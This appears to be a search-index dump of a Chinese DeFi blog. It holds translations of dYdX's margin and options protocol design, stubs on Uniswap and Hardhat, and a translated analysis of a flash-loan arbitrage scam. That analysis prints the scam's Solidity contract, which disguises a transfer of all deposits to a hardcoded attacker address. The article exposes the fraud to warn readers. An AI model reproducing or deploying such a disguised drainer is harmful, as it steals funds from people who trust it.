[{"categories":["DeFi"],"content":" 本文作者：@7Levy 白皮书翻译：@7Levy 参考链接： dYdX whitepaper-Antonio Juliano ","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/:0:0","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—保证金协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/"},{"categories":["DeFi"],"content":"dYdX Introduction 区块链的兴起让任何人都可以在开放网络上拥有和转移资产，而无需去信任任何外方。与现有经济体系结构不同的是，区块链在全世界都是自由且同样可用的。这个现象促使了区块链上数字资产的迅猛增长。许多中心化和去中心化的平台旨在促进已存在资产的高效交换，有更多平台正在开发中。这些平台允许投资者持有各种资产的多头头寸。然而，这些平台目前很难甚至是不可能去持有更复杂的头寸。 dYdX允许创建完全新类别的资产，这些资产可以从基于区块链的底层资产中获利。通过衍生品和保证金交易，投资者们可以用投资组合去实现优秀的风险管理，同时这也开辟了新的投机途径。 ","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/:1:0","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—保证金协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/"},{"categories":["DeFi"],"content":"现有成果 支持衍生品或保证金交易的去中心化协议很少，而且他们都没什么特别重要的用途。中心化交易所们也无法提供足够多的去中心化金融资产。因此，我们很难在现有的大部分去中心化资产上卖空或持有更复杂的头寸。 \r","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/:2:0","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—保证金协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/"},{"categories":["DeFi"],"content":"协议 dYdX包含了一些列协议，指定不同金融产品的操作和执行。我们计划优先开发最广泛流行的类型。我们在下面大概描述了下期权和保证金交易协议的实现。我们计划在未来开发更多的金融产品。 ","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/:3:0","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—保证金协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/"},{"categories":["DeFi"],"content":"保证金交易协议 简介 在一个保证金交易中，交易者借入一项资产然后立马将其换成另一项资产。资产必须偿还给贷方，通常也连同利息一起。 保证金交易中包括卖空和买多。 在卖空交易中，某投资者借入一项资产然后以报价货币将其售出。如果资产价格下跌，由于重新买入后去偿还贷方的成本低于初始售价，那么这个投资者就可以从中获利。如果资产价格上涨，由于重新买入后去偿还贷方的成本高于初始售价，那么这个投资者就会亏损。 在买多交易中，某投资者借入报价货币然后用其买入一项资产。如果价格上涨，投资者获利，如果价格下跌，投资者亏损。持仓的收益或亏损等于标的资产的变化乘以杠杆比例，即借入金额加上交易者支付的金额和交易者支付的金额之比。 实例 卖空被投资者用于从下跌的资产中获利，卖空可用于投机和对冲。当投资者们认为某项资产价格会下降时，他们可以将卖空作为投机手段。卖空相关资产去对冲现有的持仓。 当资产价格上涨时，买多的杠杆用于乘以收益。买多可用于投机，因为其可以使交易人用更少的资金去获得更多的收益。投资者可以使用买多进行更有效的资金分配，因为每项投资实现相同结果所需的资本更少。 用于保证金头寸的借贷，可以给借贷人带来贷款利息。 概述 dYdX保证金交易协议使用了一个主以太坊合约来方便ERC20代币的去中心化保证金交易。贷款方对包含贷款信息(如数量、涉及代币和利率)的消息进行签名，以此来为保证金交易提供贷款。这些贷款可以在非区块链平台上传输和上市。 交易者通过向dYdX保证金合约发送一笔包含贷款要约、借入代币的买单和要借入的金额的交易来建仓。一旦接收到这笔交易，该智能合约将保证金从交易者转移到自己的地址上，然后在外部的去中心化交易所(0x等)使用指定的买单将借出的代币售出。合约在头寸有效期内会保留押金和出售借贷代币所获得的的代币。 当交易者发送一笔包含卖单的交易给合约时，仓位会关闭，这笔卖单以低于或等于抵押金额的价格出售欠贷款方的代币。收到这笔交易后，合约会用外部去中心交易所在订单创建者和其之间执行这笔交易。随后，合约把借出代币的欠款发送给贷款方。欠贷款方的金额包括利息。发送给交易方所有剩余的代币，这等于抵押金和利润。需要注意的是，如果价格和仓位是逆势的，利润可能为负。 \r实现 1.合约 对于保证金交易，有三个需要用到的合约：Margin(保证金)合约、Proxy(代理合约)合约以及Vault(金库)合约。 代理合约用于转移用户资金。用户在代理合约上设置代币津贴，授权代理合约代表他们转移资金。 保证金合约提供保证金交易的功能。它包含了所有的业务逻辑和公共函数。其同时也包含了合约存储的仓位状态。保证金合约的设计让现有的仓位无法被外部方修改(参考治理部分)。 金库合约将资金锁仓。它对开提供一个简易的接口，保证金合约有权使用这个接口。 2.Offering Message 保证金的第一要素是持有需借出代币的贷方，并且其希望以给定的押金和利率借出。借贷者准备并以如下消息进行加密签名。 变量名 变量类型 描述 owedToken address 所欠代币的地址-从贷方借得需要还的代币 heldToken address 持有代币的地址-仓位托管的代币 payer address 提供贷款资金的地址-如果该地址和签名者不同，假定它是合约的地址并且通过接口获得许可 signer address 对提供的贷款进行加密签名的地址 owner address 贷款后拥有款项的地址。所有付款将汇入该地址 taker address(optional) 如果设置该变量，只有该地址可以贷款 feeRecipient address(optional) 接受款项相关的中继器手续费的地址 lenderFeeToken address(optional) 贷方手续费的所属代币地址 takerFeeToken address(optional) 借方手续费的所属代币地址 maxAmount uint256 贷款款项的最大金额。以所欠代币为单位计价 minAmount uint256 贷款款项所能接受的最小金额。以所欠代币为单位计价 minHeldToken uint256 抵押和售出后锁仓的代币最小金额(基于maxAmount) lenderFee uint256(optional) 贷方手续费(基于maxAmount) takerFee uint256(optional) 借方手续费(基于maxAmount) interestRate uint32 利率(连续复利，以年度百分率表示，最多保留六位小数) interestPeriod uint32(optional) 利率周期，每个周期增加利率 expirationTimestamp uint32 款项到期的时间戳 callTimeLimit uint32 在贷款方追加保证金后需要关闭仓位的最短时间(按秒计算) maxDuration uint256 贷款的最长期限，相对于开仓时间计算 然后会在交易对手之间进行链下广播该消息。如果交易者愿意，这会成为提交贷款的一个捆绑协议。该协议与用于中继这些已签名消息的交换媒介无关。按照预期这些要约将在作为中继器的中心化平台上列出，并将在利率和条款上展开竞争。较大的OTC交易可以通过传统的方式达成一致，然后使用这个协议进行正式的约束。 3.Buyer 保证金交易的第二要素是买单，买单作为保证金交易的一部分来填写。和贷款要约类似，买单可以通过任何方式传输。买方不参与贷款和保证金交易。此订单可以是任何价格，并且必须由交易者选择。唯一的先决条件是订单必须至少与交易者作为保证金交易的一部分出售的代币一样多。选择符合交易者经济利益的最优价格完成买单。 dYdX允许任何去中心交易所买/卖的标准。通过封装外部的去中心化交易所的智能合约到一个提供保证金接口的合约中来实现。封装的合约叫做ExchangeWrapper。ExchangeWrapper由交易者在保证金交易中指定，无需特殊权限。这意味着任何人都可以编写、部署和使用ExchangeWrapper作为任何去中心化交易所。dYdX实现的第一个ExchangeWrapper是封装的0x交易所合约，允许任何0x的订单在dYdX上建仓。 4.Position Opening 交易者给保证金合约发送一笔交易来开仓： 已签名的贷款要约 用held token购买owed token的买单 用来完成买单的ExchangeWrapper合约地址 交易者希望借入的owed token数量 一个布尔值，指定交易者是希望用held token还是owed token作为保证金 交易者指定的保证金数量 开仓的地址 当合约接受到交易会进行如下操作： 验证贷款信息的签名及输入 Margin合约首先会调用Proxy合约转移保证金，如果保证金是held token那就把它转移到Vault合约，如果是owed token那就把它转移到ExchangeWrapper合约 保证金合约调用代理合约把所要求数量的owed token从贷方那转移到ExchangeWrapper那 保证金合约记录贷款的使用信息，存储在mapping中。用这种方式可以记录剩余的贷款和避免他人利用已签名的贷款信息进行重放攻击 Margin合约调用ExchangeWrapper，根据买单把owed token换成held token。买方作为这笔交易的maker，ExchangeWrapper作为taker。交易合约(如果使用0x的ExchangeWrapper，那就是0x交易合约)会验证买单的签名和输入信息然后执行这笔交易。 Margin合约调用Proxy合约,把ExchangeWrapper中卖掉后收到的held token转移到Vault合约。在仓位限期内，held token会在Vault合约中被锁定。 仓位的详情存储在合约里，通过唯一的公共标识进行映射。后续交易者或者贷方可以根据这个标识与仓位进行交互。 所有的步骤都是原子性的，也就是说这些步骤只能是全部成功或者全部失败。最后，Vault合约中会持有一定数量的held token。如果保证金是held token，数额等于保证金数额加卖出owed token获得的held token的数额。如果保证金是owed token，数额等于卖出借来的owed token与保证金(此时是owed token)得到的held token数额。Vault合约在仓位关闭前会一直锁定资金。 5.Closing 交易者可以在任何时间对部分仓位进行平仓。向Margin合约发送一个卖单，卖单指定卖出held token的数额，只要数额大于或等于欠贷方的owed token数量。卖单可以使任何价格，只要仓位有足够的held token(根据平仓部分占的比例来分配)清算，交易者可以选择最低的价格使得利益最大化。 当Margin合约收到这笔交易，会执行如下操作： 计算欠贷方的owed token总额，使用连续复利的方式计算利息 如果用held token归还，Margin合约调用ExchangeWrapper根据所欠的owed token数额来归还held token；如果用owed token归还，则卖出所有的held token，买入owed token。交易过后，Vault合约会持有所欠数额的owed token和一定数量的held token或是owed token，总额等于保证金和利润(可能为负)。 Margin合约调用Proxy合约将所欠数额的owed token从ExchangeWrapper转移到贷方。 Margin","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/:3:1","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—保证金协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/"},{"categories":["DeFi"],"content":"期权协议 简介 在一个期权中，资产持有人以指定的期权执行价格与未来日期去出售购买或出售该资产的权利。购买资产被称为看涨期权，售出资产被称为看跌期权。期权的卖方(立权人)在出售中收取溢价，但如果期权持有人愿意，那就必须以约定的价格和日期去出售或购买资产。备兑期权指的是将标的资产作为抵押品，因此可以保证未来某个日期收回。期权本身可以在公开市场上交易。我们描述了一种美式备兑期权的实现，或者是一种可以在截止期之前随时执行的期权。 实例 期权支持多种交易策略，这些策略可以用于投机和风险管理。 期权可以为投机提供额外的杠杆。举个例子，假设AAPL的价格现在是100美金，有一个投资者投资了1000美金的AAPL并相信其会上涨。投资者可以一100美金的单价购买十股，如果价格涨到110美金，这时候售出，那么就会获得100美金的本金和10%的利润。假设投资者买了执行价为100美金，溢价为2美金的看涨期权。投资者可以买入500个这些期权。如果AAPL价格再次上涨到110美金，投资者可以行使期权以100美金的价格买入AAPL，然后立刻在110美金的价位卖出这些AAPL，每份期权获利10美金。因为投资者必须为每份期权付2美金的溢价，所以对于每份期权来说，最终会是8美金的利润。这意味着投资者的利润会是4000美金，也就是400%的回报。这表明投资者如何利用期权获得比简单持有资产更高的回报。 期权也可以对冲或降低投资风险。假设投资者做多100股AAPL，再次以100美金单价成交。投资者可以以90美金单价购得看跌期权，每份溢价2美金。这种期权会确保仅收取2%的费用，在期权有效期内，投资者的损失不会超过10%。 期权也可以支持更多的交易策略，如跨式、勒式、领式等。这类策略可以锁定价格，从任何方向的波动中获利，或者是从资产的稳定价格中获利。 概述 实现 1.合约 我们使用三种智能合约来实现期权的发行和功能：Creatot,Proxy和CoverdOption合约。 Creator负责创建所有的CoverdOption。任何人都可以创建一种CoverdOption，只要提供以下规范： 期权的ERC20代币地址(称为base token) 用来支付执行价格和移除费用的ERC20代币地址(被称为quote token) 执行价格（分成两个部分以得到base token和quote token之间的汇率） 有效期 创建一种类型的CoveredOption仅开放用于出售，并不会发布任何的期权。对于每个输入参数组合，只能存在唯一的期权。 Proxy合约负载在用户之间转移代币。用户使用ERC20津贴功能去授权Proxy合约转移他们的代币。每一个新的CoverdOption在创建者创建时都会被授权使用Proxy合约转移用户资金。 CoveredOption合约代表一种特定类型的备兑期权。每一个都实现了ERC20代币接口，以允许期权的股份在发行后可以进行交易和转让。这意味着每个期权都可以像任何ERC20代币一样在交易所进行公开交易。 2.Issuance(期权发行) CoveredOption期权使用0x协议的交换功能以促使新期权的发行。期权可以在有效期内的任意时间点发行。为了发行新的期权，卖家需要广播一个已签名的0x格式消息，指定一下信息： 立权人(卖家)的地址 收款人的地址 立权人提供的base token数额 购买时，作为溢价支付给立权人的quote token数额 期权售卖的有效时间 立权人想要立权的CoveredOption合约地址。这个地址在消息的taker字段指定，因此只有CoveredOption合约才可以进行交易 立权人必须至少拥有和消息中所指定的一样多的base token，也必须在Proxy合约里设置津贴。买家买入的期权数量可以少于立权人所提供的的数量。在0x的术语里，立权人是交易的maker(挂单)，CoveredOption是交易的taker(吃单)。该消息可以在任何渠道进行发布，但是必须提供指定的售卖。Relayers(中继器)可以在一个期权发行订单簿上列出售卖的期权(和0x协议的relayers类似)。 当买家们想要购买一个期权，他们需要向CoveredOption合约发送一笔交易，这笔交易包含了消息签名和立权人的广播， ","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/:3:2","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—保证金协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E4%BF%9D%E8%AF%81%E9%87%91%E5%8D%8F%E8%AE%AE/"},{"categories":["DeFi"],"content":" 本文作者：@7Levy 白皮书翻译：@7Levy 参考链接： dYdX whitepaper-Antonio Juliano ","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E6%9C%9F%E6%9D%83%E5%8D%8F%E8%AE%AE/:0:0","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—期权协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E6%9C%9F%E6%9D%83%E5%8D%8F%E8%AE%AE/"},{"categories":["DeFi"],"content":"期权交易 ","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E6%9C%9F%E6%9D%83%E5%8D%8F%E8%AE%AE/:1:0","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—期权协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E6%9C%9F%E6%9D%83%E5%8D%8F%E8%AE%AE/"},{"categories":["DeFi"],"content":"简介 在一个期权中，资产持有人以指定的期权执行价格与未来日期去出售购买或出售该资产的权利。购买资产被称为看涨期权，售出资产被称为看跌期权。期权的卖方(立权人)在出售中收取溢价，但如果期权持有人愿意，那就必须以约定的价格和日期去出售或购买资产。备兑期权指的是将标的资产作为抵押品，因此可以保证未来某个日期收回。期权本身可以在公开市场上交易。我们描述了一种美式备兑期权的实现，或者是一种可以在截止期之前随时执行的期权。 ","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E6%9C%9F%E6%9D%83%E5%8D%8F%E8%AE%AE/:1:1","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—期权协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E6%9C%9F%E6%9D%83%E5%8D%8F%E8%AE%AE/"},{"categories":["DeFi"],"content":"实例 期权支持多种交易策略，这些策略可以用于投机和风险管理。 期权可以为投机提供额外的杠杆。举个例子，假设AAPL的价格现在是100美金，有一个投资者投资了1000美金的AAPL并相信其会上涨。投资者可以一100美金的单价购买十股，如果价格涨到110美金，这时候售出，那么就会获得100美金的本金和10%的利润。假设投资者买了执行价为100美金，溢价为2美金的看涨期权。投资者可以买入500个这些期权。如果AAPL价格再次上涨到110美金，投资者可以行使期权以100美金的价格买入AAPL，然后立刻在110美金的价位卖出这些AAPL，每份期权获利10美金。因为投资者必须为每份期权付2美金的溢价，所以对于每份期权来说，最终会是8美金的利润。这意味着投资者的利润会是4000美金，也就是400%的回报。这表明投资者如何利用期权获得比简单持有资产更高的回报。 期权也可以对冲或降低投资风险。假设投资者做多100股AAPL，再次以100美金单价成交。投资者可以以90美金单价购得看跌期权，每份溢价2美金。这种期权会确保仅收取2%的费用，在期权有效期内，投资者的损失不会超过10%。 期权也可以支持更多的交易策略，如跨式、勒式、领式等。这类策略可以锁定价格，从任何方向的波动中获利，或者是从资产的稳定价格中获利。 ","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E6%9C%9F%E6%9D%83%E5%8D%8F%E8%AE%AE/:1:2","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—期权协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E6%9C%9F%E6%9D%83%E5%8D%8F%E8%AE%AE/"},{"categories":["DeFi"],"content":"实现 1.合约 我们使用三种智能合约来实现期权的发行和功能：Creator,Proxy和CoverdOption合约。 Creator负责创建所有的CoverdOption。任何人都可以创建一种CoverdOption，只要提供以下规范： 期权的ERC20代币地址(称为base token) 用来支付执行价格和移除费用的ERC20代币地址(被称为quote token) 执行价格（分成两个部分以得到base token和quote token之间的汇率） 有效期 创建一种类型的CoveredOption仅开放用于出售，并不会发布任何的期权。对于每个输入参数组合，只能存在唯一的期权。 Proxy合约负载在用户之间转移代币。用户使用ERC20津贴功能去授权Proxy合约转移他们的代币。每一个新的CoverdOption在创建者创建时都会被授权使用Proxy合约转移用户资金。 CoveredOption合约代表一种特定类型的备兑期权。每一个都实现了ERC20代币接口，以允许期权的股份在发行后可以进行交易和转让。这意味着每个期权都可以像任何ERC20代币一样在交易所进行公开交易。 2.Issuance(期权发行) CoveredOption期权使用0x协议的交换功能以促使新期权的发行。期权可以在有效期内的任意时间点发行。为了发行新的期权，卖家需要广播一个已签名的0x格式消息，指定一下信息： 立权人(卖家)的地址 收款人的地址 立权人提供的base token数额 购买时，作为溢价支付给立权人的quote token数额 期权售卖的有效时间 立权人想要立权的CoveredOption合约地址。这个地址在消息的taker字段指定，因此只有CoveredOption合约才可以进行交易 立权人必须至少拥有和消息中所指定的一样多的base token，也必须在Proxy合约里设置津贴。买家买入的期权数量可以少于立权人所提供的的数量。在0x的术语里，立权人是交易的maker(挂单)，CoveredOption是交易的taker(吃单)。该消息可以在任何渠道进行发布，但是必须提供指定的售卖。Relayers(中继器)可以在一个期权发行订单簿上列出售卖的期权(和0x协议的relayers类似)。 当买家们想要购买一个期权，他们需要向CoveredOption合约发送一笔交易，这笔交易包含了消息签名、立权人的广播以及希望买的期权数量。期权与立权人存入的base token数量成1:1正比发行。CoveredOption合约收到交易后，会进行以下操作： 验证期权未超过有效期 调用Proxy合约将适当数量的quote token从买方转移到CoveredOption合约中。这是为期权支付的溢价。 调用0x协议Exchange合约，将买方的quote token和立权人的base token交换。0x的Exchange合约会验证立权人的签名，确保这笔交易是合法的。在这笔交易中，立权人作为maker，ConveredOption合约是taker。然后，立权人最终获得quote token，CoveredOption合约获得base token。清算结束前，CoveredOption合约会一直持有这些base token。 CoveredOption合约记录了立权人存取的base token数量。这些base token稍后会在期权到期未执行的情况下用到。 买方的余额会因期权的购买数量而增加。买方现在拥有这部分数量的期权，他们可以按照ERC20的标准自由转让和交易。 所有上述的步骤都是原子性的(一笔交易的步骤全发生，或全部不发生)。 3.Exercise(期权执行) 在期权到期之前，任何持有人都可以执行不超过上限数量的期权。这意味着持权人同意为每个期权支付执行价格(GoveredOption创建期间指定)。如果base token的市场价格超过期权执行价格，持权人就会从中受益。 为了执行期权，期权持有人向CoveredOption发送一笔交易，指出有多少期权需要执行。假设这笔交易有效，CoveredOption合约： 调用Proxy合约将strike price×#options的quote token从调用者转移到CoveredOption合约中 从所有者那扣除余额 根据期权执行的数量，1:1发送所有者的base token 所有者持有quote token，部分剩余的会被期权的立权人在稍后收回 4.Withdrawal(提款) 在期权到期后，期权的立权人可以取回CoveredOption中的一定比例的base token和quote token： $$ OptionsWritten/TotalOptionsWritten×(TotalTokensHeld) $$ 向CoveredOption合约发送一个withdraw交易，合约会发送给立权人每种代币的所有月，然后将立权人的余额置0。 如果一个地址时同等数量期权的持权人，也是立权人，则这个地址可以随时取回小于或等于以下数量的base token： $$ min( OptionsWritten, OptionsHeld) $$ 这么做会同时减少地址的余额和期权数量。这些服务由实体程序提供，所以立权人可以通过购买所需数量的期权拿回base token，即使是期权到期前。 ","date":"2021-11-30","objectID":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E6%9C%9F%E6%9D%83%E5%8D%8F%E8%AE%AE/:1:3","tags":["dYdX","DeFi","whitepaper"],"title":"dYdX解读—期权协议","uri":"/posts/dydx%E8%A7%A3%E8%AF%BB-%E6%9C%9F%E6%9D%83%E5%8D%8F%E8%AE%AE/"},{"categories":["ethereum"],"content":" 参考链接： https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/how-uniswap-works ​ ","date":"2021-11-28","objectID":"/posts/uniswap%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6/:0:0","tags":["uniswap","ethereum","solidity"],"title":"Uniswap解读-核心机制","uri":"/posts/uniswap%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6/"},{"categories":["ethereum"],"content":"Uniswap的运行机制 ","date":"2021-11-28","objectID":"/posts/uniswap%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6/:0:1","tags":["uniswap","ethereum","solidity"],"title":"Uniswap解读-核心机制","uri":"/posts/uniswap%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6/"},{"categories":["ethereum"],"content":"恒定乘积做市商 ","date":"2021-11-28","objectID":"/posts/uniswap%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6/:0:2","tags":["uniswap","ethereum","solidity"],"title":"Uniswap解读-核心机制","uri":"/posts/uniswap%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6/"},{"categories":["ethereum"],"content":" 原文链接：https://jeiwan.net/posts/flashloan-scam/ 作者：Ivan Kuznetsov 翻译：https://github.com/7Levy ","date":"2021-11-27","objectID":"/posts/analysis-of-a-technical-smart-contract-scam/:0:0","tags":["contract","ethereum","solidity","translate"],"title":"Analysis of a technical smart contract scam-一起智能合约骗局剖析","uri":"/posts/analysis-of-a-technical-smart-contract-scam/"},{"categories":["ethereum"],"content":"引言 我曾经在油管上看到一个叫做“我是如何在BSC上通过闪电贷套利获取BNB的\"的视频。这个视频标题很引人注目，因为在2021年初每个关注加密领域的人知道BSC链，它是以太坊的克隆链，并且大家肯定听说过在这个区块链上的DeFi被多次攻击。 在以太坊上DeFi项目的成功后，币安创造了一个以太坊的复制品，据称币安资助了许多成功和先进的类以太坊DeFi项目。一切看起来都很好，直到2021年春天发生的一系列针对BSC的黑客攻击。 大多数攻击使用的是类似的方案： DeFi合约在代币余额计算上存在漏洞。 攻击者使用闪电贷去扩充代币池。 攻击者随后利用这些漏洞去做一些大额交易或者代币互换操作，欺骗合约认为所有余额都是正确的。 攻击者归还闪电贷后能从中获取些许利润。 所以，对于任何一个听说过这些攻击的人来说（包括我）都跃跃欲试。 ","date":"2021-11-27","objectID":"/posts/analysis-of-a-technical-smart-contract-scam/:1:0","tags":["contract","ethereum","solidity","translate"],"title":"Analysis of a technical smart contract scam-一起智能合约骗局剖析","uri":"/posts/analysis-of-a-technical-smart-contract-scam/"},{"categories":["ethereum"],"content":"骗局细节 该视频的作者分享了他们是如何通过闪电贷进行一笔套利并赚取一些BNB（当时BNB价值大概为400美金一个），而且，他们十分大方地分享了这项技术。 观众要去部署一个智能合约去完成这项工作。 为了支付交易费用，观众要在合同中存取0.25BNB。该合约属于观众，所以一切看起来很安全。 然后，观众需要执行合约的闪电贷函数。 作者甚至将合约上传到了以太坊在线IDE Remix上，观众只需要点击几个按钮。不难想到很多人跟着这个教程做然后失去了0.25BNB，他们存入合约然后没有得到任何回报。在写本文的时候，已经有超过44个BNB（17500多美金）被从攻击者的地址存取。 ","date":"2021-11-27","objectID":"/posts/analysis-of-a-technical-smart-contract-scam/:2:0","tags":["contract","ethereum","solidity","translate"],"title":"Analysis of a technical smart contract scam-一起智能合约骗局剖析","uri":"/posts/analysis-of-a-technical-smart-contract-scam/"},{"categories":["ethereum"],"content":"如何识破这类骗局 先说第一点，明显的是0.25BNB的费用：对于BSC来说是比十分高昂的手续费，你几乎不会提交一个高额成本的交易。显然，攻击者不希望交易过于可疑，将金额设置的足够低，看起来就像一笔真正的费用，但大到足以满足他们的贪婪。 第二点，如果你不知道一个合约是如何运作的，永远不要去运行它。如下是观众们按照指引部署的合约（注释是作者添加的）。 pragma solidity ^0.5.0; // PancakeSwap Smart Contracts import \"https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol\"; import \"https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol\"; //BakerySwp Smart contracts import \"https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol\"; // Router import \"ipfs://QmUSQQNWBJ6snmx5FvafDSBCPCy63BLTpwM61dYjRzwLkN\"; // Multiplier-Finance Smart Contracts import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol\"; import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol\"; contract InitiateFlashLoan { RouterV2 router; string public tokenName; string public tokenSymbol; uint256 flashLoanAmount; constructor( string memory _tokenName, string memory _tokenSymbol, uint256 _loanAmount ) public { tokenName = _tokenName; tokenSymbol = _tokenSymbol; flashLoanAmount = _loanAmount; router = new RouterV2(); } function() external payable {} function flashloan() public payable { // Send required coins for swap address(uint160(router.pancakeSwapAddress())).transfer( address(this).balance ); //Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap. router.borrowFlashloanFromMultiplier( address(this), router.bakerySwapAddress(), flashLoanAmount ); //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract. router.convertBnbToBusd(msg.sender, flashLoanAmount / 2); //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap. router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender); //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas. router.transferBnbToMultiplier(router.pancakeSwapAddress()); //Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time. router.completeTransation(address(this).balance); } } 一切看起来都很不错： 导入官方的PancakeSwap、BakerySwap和Multiplier-Finance合约。 导入一个路由合约(IPFS???) 然后经过flashloan函数发送合约的以太给PancakeSwap的地址，接着从Multiplier-Finance借一笔闪电贷，进行套利交易，支付贷款，最后将一些利润返还给合约。 事实上，合约只做了一件事，它把所有存入合同的BNB发送到了攻击者的地址，IPFS导入看起来很可疑，他们在那里使用IPFS是有原因的：我们因此很难获得路由合约并查看它在做什么。 路由合约包含了很多行使得其混杂难以阅读，但我们不难发现一个重要的部分： ... contract RouterV2 { ... function pancakeSwapAddress() public pure returns (address) { return 0x2593F13d5b7aC0d766E5768977ca477F9165923a; } ... } 这是主合约将所有资金发送出去的地址。 ","date":"2021-11-27","objectID":"/posts/analysis-of-a-technical-smart-contract-scam/:3:0","tags":["contract","ethereum","solidity","translate"],"title":"Analysis of a technical smart contract scam-一起智能合约骗局剖析","uri":"/posts/analysis-of-a-technical-smart-contract-scam/"},{"categories":["ethereum"],"content":"总结 这个骗局是个很有意思的案例：大多数骗局针对的是不懂技术的加密货币用户，而且这个骗局的目标人群是知道闪电贷攻击、部署合约以及交互的人，这不是一个大众群体，但是就像我们看见的一样，许多人任然成为骗局的受害者。 如果你喜欢阅读区块链安全和黑客事件，我非常推荐去订阅Blockchain Threat Intelligence。 ","date":"2021-11-27","objectID":"/posts/analysis-of-a-technical-smart-contract-scam/:4:0","tags":["contract","ethereum","solidity","translate"],"title":"Analysis of a technical smart contract scam-一起智能合约骗局剖析","uri":"/posts/analysis-of-a-technical-smart-contract-scam/"},{"categories":["sc"],"content":"环境配置 ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:1:0","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"安装yarn npm install -g yarn yarn --version ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:1:1","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"安装hardhat yarn add -D hardhat #写入当前目录的devDependencies ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:1:2","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"安装依赖 npm install --save-dev @nomiclabs/hardhat-waffle 